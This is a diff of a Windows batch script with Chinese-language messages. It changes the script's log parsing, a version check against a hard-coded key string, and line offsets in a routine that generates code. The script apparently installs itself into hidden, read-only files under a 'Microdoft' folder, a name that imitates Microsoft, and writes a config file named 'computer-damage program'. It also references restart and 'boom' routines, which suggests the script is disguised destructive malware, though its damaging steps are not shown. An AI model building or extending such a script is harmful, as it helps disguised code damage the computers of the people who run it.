@@ -11,16 +11,15 @@ goto Program start
 set str=0001a 814682 67248248310002a 184558 58134824530002b 348314 57434848650002c 165082 13565038210002d 896514 18641948940003a 153843 24832184650003b 168462 04560286480003c 186548 21256021650003d 192168 1568421846
 call:Ver
 if not !VF!==9 (>&2 echo 版本錯誤。 & >>"%~dp0log.txt" echo 版本錯誤。 & >nul timeout /t 10 & exit /b)
-if exist "%~dp0log.txt" (>nul findstr /b /e /offline /c:"微哆動作紀錄 --------------------------------------------- " "%~dp0log.txt" && >>"%~dp0log.txt" echo ---------------------------------------------------------- ) else (>"%~dp0log.txt" echo 微哆動作紀錄 --------------------------------------------- )
-if not %errorlevel%==0 >"%~dp0log.txt" echo 微哆動作紀錄 --------------------------------------------- 
+if exist "%~dp0log.txt" (for /f "eol=; tokens=* delims= usebackq" %%a in ("%~dp0log.txt") do (if "%%a"=="微哆動作紀錄 --------------------------------------------- " ((>>"%~dp0log.txt" echo ---------------------------------------------------------- ) & call:Nu & goto start) else (>"%~dp0log.txt" echo 微哆動作紀錄 --------------------------------------------- ) & call:Nu & goto start)
+) else (>"%~dp0log.txt" echo 微哆動作紀錄 --------------------------------------------- )
 call:Nu & goto start
 
 :Ver
 set strL=%str%
 set VF=0
-for /L %%c in (1,1,9) do (
->nul 2>&1 findstr /b /e /offline /c:"!strL:~0,23!" %Vfile%
-if !errorlevel!==0 set /a VF+=1
+for /f "eol=; tokens=* delims= usebackq" %%a in (%Vfile%) do (
+if "%%a"=="!strL:~0,23!" set /a VF+=1
 set strL=!strL:~23!
 )
 goto :eof
@@ -409,7 +408,7 @@ attrib -r -h "%SystemDrive%\Microdoft\CustomDO.cmd"
 call:type head
 attrib +r -a +h "%SystemDrive%\Microdoft\DO.bat"
 attrib +r -a +h "%SystemDrive%\Microdoft\CustomDO.cmd"
->"%SystemDrive%\Microdoft\電腦毀損程式.cfg" echo set=%S1%
+>"%SystemDrive%\Microdoft\電腦毀損程式.cfg" echo set1=%S1%
 attrib -a +h "%SystemDrive%\Microdoft\電腦毀損程式.cfg"
 if not exist "%userprofile%\Desktop\Microdoft" mkdir "%userprofile%\Desktop\Microdoft" && >>"%~dp0log.txt" echo 建立桌面資料夾成功
 if not exist "%SystemDrive%\Microdoft\log.txt" >>"%SystemDrive%\Microdoft\log.txt" echo.
@@ -499,10 +498,10 @@ set end=
 >>%G% echo.
 )
 if %count%==3 (
-set line=27
+set line=26
 set tGline=0
 set end=:Nu
-set Gline=3
+set Gline=2
 set skipline=skip=1
 call:typeC
 >>%G% echo ^)
@@ -510,33 +509,33 @@ call:typeC
 >>%G% echo.
 )
 if %count%==4 (
-set line=33
+set line=32
 set tGline=1
 set end= 
 >>%G% echo.
 )
 if %count%==5 (
-set line=38
+set line=37
 set tGline=0
 set end=:restart
 set Gline=2
-set skipline=skip=4
+set skipline=skip=3
 call:typeC
 >>%G% echo goto :eof
 >>%G% echo.
 )
 if %count%==6 (
-set line=46
+set line=45
 set end=:boom
 >>%G% echo.
 )
 if %count%==7 (
-set line=55
+set line=54
 set end=:dots
 >>%G% echo.
 )
 if %count%==8 (
-set line=65
+set line=64
 set end=:expand
 >>%G% echo.
 )
@@ -563,7 +562,7 @@ set line=23
 set tGline=0
 set end=:restart
 set Gline=2
-set skipline=skip=4
+set skipline=skip=3
 call:typeC
 >>%G% echo goto :eof
 >>%G% echo.
